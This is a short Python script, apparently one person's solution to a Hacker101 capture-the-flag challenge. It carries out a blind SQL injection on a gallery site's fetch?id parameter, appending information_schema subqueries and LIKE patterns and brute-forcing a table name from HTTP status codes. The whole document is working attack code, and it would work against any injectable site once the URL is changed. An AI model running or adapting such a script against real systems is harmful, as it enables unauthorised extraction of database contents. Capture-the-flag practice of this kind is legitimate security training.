# This is the script I made for hacker101 CTF Magical Image Gallery challenge

import requests
import os, sys
import string


url = "http://35.190.155.168/f8d0655e5a/fetch?id=1"


def change_payload(url,newpayload):
    if '_' in newpayload:
        newpayload = newpayload.replace("%_","{}%")
        injection(url,newpayload)
    else:
        print("[+] Found the database:" + newpayload)
        exit()

def url_fuzz(url,payload):
    pay = " AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) "
    res = requests.get(url+pay+payload)
    if res.status_code == 200:
        print(str(res.status_code) + " --> "+payload)
        change_payload(url,payload)


lowercase = string.ascii_lowercase
#uppercase = string.ascii_uppercase

payloadstream = []

for i in lowercase:
    payloadstream.append(i)

#for i in uppercase:
 #   payloadstream.append(i)

for i in range(0,10):
   payloadstream.append(i)

#payload = " AND database() LIKE '{}%_____'"

payload = "AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)"
payload2 = "LIKE '{}%_____'"

def injection(url,query):

    for i in payloadstream:
        que = query.format(i)
        url_fuzz(url,que)

injection(url,payload2)
